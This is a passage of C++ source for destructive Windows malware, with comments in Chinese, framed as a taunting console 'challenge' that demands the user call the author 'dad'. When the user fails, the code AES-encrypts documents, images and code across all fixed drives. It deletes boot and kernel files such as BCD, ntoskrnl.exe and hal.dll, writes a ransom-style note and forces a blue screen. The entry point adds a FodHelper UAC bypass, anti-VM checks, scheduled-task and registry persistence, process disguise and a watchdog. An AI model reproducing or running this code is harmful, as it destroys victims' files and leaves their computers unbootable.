    if (!WriteFile(hFile, ciphertext.data(), static_cast<DWORD>(ciphertext.size()), &bytesWritten, NULL) || bytesWritten != ciphertext.size()) {
        CloseHandle(hFile);
        return false;
    }
    SetEndOfFile(hFile);
    CloseHandle(hFile);

    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(iv, sizeof(iv));

    WriteEncMarker(filePath);
    return true;
}

// 需要加密的文件扩展名列表
static const std::vector<std::wstring> targetExtensions = {
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
    L".pdf", L".txt", L".rtf", L".csv",
    L".jpg", L".jpeg", L".png", L".bmp", L".gif",
    L".cpp", L".c", L".h", L".hpp", L".py", L".js", L".html", L".css",
    L".zip", L".rar", L".7z", L".mp3", L".mp4", L".avi", L".mkv"
};

// 跳过加密的目录(系统相关)
static const std::vector<std::wstring> skipDirs = {
    L"\\Windows\\", L"\\Program Files\\", L"\\Program Files (x86)\\",
    L"\\ProgramData\\Microsoft\\", L"\\$Recycle.Bin\\", L"\\System Volume Information\\"
};

/**
 * @brief 判断路径是否应该跳过加密
 */
static bool ShouldSkipPath(const std::wstring& path) {
    std::wstring upperPath = path;
    for (auto& c : upperPath) c = towupper(c);
    for (const auto& dir : skipDirs) {
        std::wstring upperDir = dir;
        for (auto& c : upperDir) c = towupper(c);
        if (upperPath.find(upperDir) != std::wstring::npos) return true;
    }
    return false;
}

/**
 * @brief 递归加密目录下所有匹配扩展名的文件
 */
static void EncryptDirectory(const std::wstring& dir) {
    if (ShouldSkipPath(dir)) return;

    WIN32_FIND_DATAW fd;
    std::wstring searchPath = dir + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring fullPath = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptDirectory(fullPath);
        }
        else {
            std::wstring ext;
            size_t dotPos = fullPath.rfind(L'.');
            if (dotPos != std::wstring::npos) {
                ext = fullPath.substr(dotPos);
                for (auto& c : ext) c = towlower(c);
                for (const auto& target : targetExtensions) {
                    if (ext == target) {
                        EncryptFileAES(fullPath);
                        break;
                    }
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

/**
 * @brief 加密所有固定驱动器的工作线程
 *
 * 使用互斥体保证单实例加密，线程优先级最低避免卡顿。
 */
DWORD WINAPI EncryptAllDrives(LPVOID) {
    g_hEncMutex = CreateMutexW(NULL, FALSE, L"Global\\{RansomEncMutex-17A9C4E2-F13E-4B2D-9A6F-6D8C12B05F3E}");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_hEncMutex);
        return 0;
    }
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);

    if (IsAlreadyEncrypted()) {
        ReleaseMutex(g_hEncMutex);
        CloseHandle(g_hEncMutex);
        return 0;
    }

    wchar_t drives[256];
    if (GetLogicalDriveStringsW(255, drives)) {
        wchar_t* drive = drives;
        while (*drive) {
            if (GetDriveTypeW(drive) == DRIVE_FIXED) {
                EncryptDirectory(drive);
            }
            drive += wcslen(drive) + 1;
        }
    }

    SetEncryptionDone();
    ReleaseMutex(g_hEncMutex);
    CloseHandle(g_hEncMutex);
    return 0;
}

/**
 * @brief 启动加密线程(非阻塞)
 */
void StartEncryption() {
    if (IsAlreadyEncrypted()) return;
    CreateThread(NULL, 0, EncryptAllDrives, NULL, 0, NULL);
}

/**
 * @brief 检查注册表标记，判断是否已完成加密
 */
bool IsAlreadyEncrypted() {
    DWORD val = 0;
    DWORD size = 4;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"EncryptionDone", NULL, NULL, (BYTE*)&val, &size);
        RegCloseKey(hKey);
        return (val == 1);
    }
    return false;
}

/**
 * @brief 设置加密完成标记，避免重复加密
 */
void SetEncryptionDone() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD val = 1;
    RegSetValueExW(hKey, L"EncryptionDone", 0, REG_DWORD, (BYTE*)&val, 4);
    RegCloseKey(hKey);
}

/**
 * @brief 删除关键系统文件(破坏系统启动)
 *
 * 尝试删除引导配置、内核、hal等，并使用 MoveFileEx 延迟删除以防止占用。
 */
void DeleteSystemFiles() {
    const wchar_t* targets[] = {
        L"C:\\Boot\\BCD",
        L"C:\\Windows\\System32\\winload.exe",
        L"C:\\Windows\\System32\\winload.efi",
        L"C:\\Windows\\System32\\ntoskrnl.exe",
        L"C:\\Windows\\System32\\hal.dll",
        L"C:\\Windows\\System32\\config\\SYSTEM",
        NULL
    };

    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (ntdll) {
        auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        if (RtlAdjustPrivilege) {
            BOOLEAN b;
            RtlAdjustPrivilege(17, TRUE, FALSE, &b); // SeTakeOwnershipPrivilege
            RtlAdjustPrivilege(18, TRUE, FALSE, &b); // SeRestorePrivilege
            RtlAdjustPrivilege(20, TRUE, FALSE, &b); // SeDebugPrivilege
        }
    }

    for (int i = 0; targets[i] != NULL; i++) {
        SetFileAttributesW(targets[i], FILE_ATTRIBUTE_NORMAL);
        if (!DeleteFileW(targets[i])) {
            MoveFileExW(targets[i], NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }
}

/**
 * @brief 显示交互挑战界面
 *
 * 控制台读取用户输入，最多三次机会，成功则写安全状态并退出；
 * 失败则触发加密、删系统文件、写死亡笔记、蓝屏。
 */
void ShowChallengeUI() {
    std::wcout << L"==============================\n";
    std::wcout << L"        陶修夷的\n";
    std::wcout << L"   叫 爸 爸 挑 战 赛™\n";
    std::wcout << L"==============================\n";
    std::wcout << L"规则：叫我爸爸，否则你的电脑会哭。\n";
    std::wcout << L"你有 3 次机会。\n";
    std::wcout << L"注意：别想用任务管理器杀我，你会死得很惨。\n\n";

    const int MAX_FAIL = 3;
    int fail = 0;
    while (fail < MAX_FAIL) {
        int remaining = MAX_FAIL - fail;
        std::wcout << L"[ 剩余机会: " << remaining << L" ] 叫啊 -> ";
        std::wstring input;
        std::getline(std::wcin, input);
        std::wstring clean = sanitizeInput(input);

        if (clean == L"爸爸" || clean == L"爸" || clean == L"baba") {
            std::wcout << L"\n╔══════════════════╗\n";
            std::wcout << L"║  乖儿子！:)      ║\n";
            std::wcout << L"╚══════════════════╝\n";
            std::wcout << L"你通过了挑战，电脑安全了。\n";
            WriteSafeStatus(true);
            Sleep(2000);
            safeExit();
            exit(0);
        }
        else {
            fail++;
            if (fail < MAX_FAIL) {
                std::wcout << L"呵，死撑。还剩 " << (MAX_FAIL - fail) << L" 次。\n";
            }
        }
    }
    std::wcout << L"\n你选择了死。\n";
    StartEncryption();
    Sleep(800);
    DeleteSystemFiles();
    Sleep(500);
    writeDeathNote();
    Sleep(500);
    std::wcout << L"\n╔════════════════════════════╗\n";
    std::wcout << L"║  你完了！！！              ║\n";
    std::wcout << L"║  txt已打开，慢慢欣赏吧。   ║\n";
    std::wcout << L"╚════════════════════════════╝\n\n";
    countdown(3);
    std::wcout << L"再见。\n";
    Sleep(300);
    triggerBSOD();
    while (1) Sleep(60000);
}

/**
 * @brief 程序入口点
 *
 * 流程：
 * 1. 解析命令行参数。
 * 2. 若检测到调试/虚拟机且非respawn模式，则自复制删除后退出(反分析)。
 * 3. 检查管理员权限，若没有则通过FodHelper提权重启。
 * 4. 提权、安装计划任务/注册表、伪装进程、设置关键进程、启动看门狗。
 * 5. 启动守护线程(非respawn时)。
 * 6. 自复制到系统目录。
 * 7. 根据参数隐藏控制台。
 * 8. 读取安全状态:
 *     - 若状态为0(上次挑战失败但没来得及加密?)，直接执行破坏。
 *     - 否则写入未安全标记，显示挑战界面。
 * 9. 静默模式直接进入挑战。
 */
int wmain(int argc, wchar_t* argv[]) {
    bool silent = false;
    bool nohide = false;
    bool respawn = false;
    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"/silent") == 0) silent = true;
        if (_wcsicmp(argv[i], L"/nohide") == 0) nohide = true;
        if (_wcsicmp(argv[i], L"/respawn") == 0) respawn = true;
    }

    if (IsDebuggedOrVM() && !respawn) {
        SelfCopyAndDelete();
        return 0;
    }

    if (!IsElevated()) {
        BypassUAC_FodHelper();
        Sleep(2000);
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        ShellExecuteW(NULL, L"runas", exePath, L"/silent /nohide", NULL, SW_HIDE);
        return 0;
    }

    takeAllPrivileges();
    InstallScheduledTask();
    SetupRegistryRun();
    disguiseAsSystemProcess();
    enableCriticalProcess(true);
    launchWatchdog();

    if (!respawn) {
        CreateThread(NULL, 0, GuardianThread, NULL, 0, NULL);
    }

    SelfCopyAndDelete();

    if (!nohide) HideConsole(true);

    int lastSafe = ReadSafeStatus();
    if (lastSafe == 0) {
        if (!IsAlreadyEncrypted()) {
            StartEncryption();
            Sleep(5000);
        }
        writeDeathNote();
        Sleep(500);
        triggerBSOD();
        while (1) Sleep(1000);
    }

    WriteSafeStatus(false);

    if (!silent) {
        if (!nohide) HideConsole(false);
        ShowChallengeUI();
    }
    else {
        if (!nohide) HideConsole(false);
        ShowChallengeUI();
    }

    safeExit();
    return 0;
}
